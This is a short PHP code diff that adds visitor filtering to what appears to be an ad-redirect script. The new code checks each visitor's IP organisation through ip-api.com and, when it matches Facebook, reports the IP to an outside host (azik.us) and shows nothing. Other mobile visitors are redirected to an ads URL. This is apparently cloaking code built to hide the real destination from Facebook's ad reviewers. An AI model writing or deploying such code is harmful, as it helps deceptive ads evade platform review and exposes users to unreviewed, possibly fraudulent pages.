@@ -42,6 +42,23 @@ if(in_array($ip, $ipfilters)){
   exit();
 }
 
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/$ip");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_TIMEOUT, 1);
+$output = curl_exec($ch);
+curl_close($ch);
+$ipconfig = json_decode($output, true);
+if(isset($ipconfig["org"]) && strpos(strtolower($ipconfig["org"]), "facebook") !== false){
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, "http://azik.us/block.php?ip=$ip");
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
+	curl_setopt($ch, CURLOPT_TIMEOUT, 2);
+	curl_exec($ch);
+	curl_close($ch);
+	exit();
+}
+
 if($detect->isMobile() || $browser->isMobile()){
   header("Location:".$ads);
   exit();
